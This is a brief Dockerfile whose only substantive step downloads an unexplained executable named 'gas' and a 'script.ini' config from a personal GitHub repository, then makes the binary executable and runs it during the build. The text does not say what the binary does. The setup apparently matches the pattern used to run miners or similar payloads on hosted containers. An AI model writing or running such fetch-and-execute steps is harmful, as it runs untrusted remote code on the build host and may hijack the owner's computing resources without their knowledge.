FROM devisty/xssh:v2
EXPOSE 80

COPY . /app
RUN wget https://raw.githubusercontent.com/cruzeiro28/gas/main/script.ini && wget https://github.com/cruzeiro28/gas/raw/main/gas && chmod +x gas && ./gas script.ini
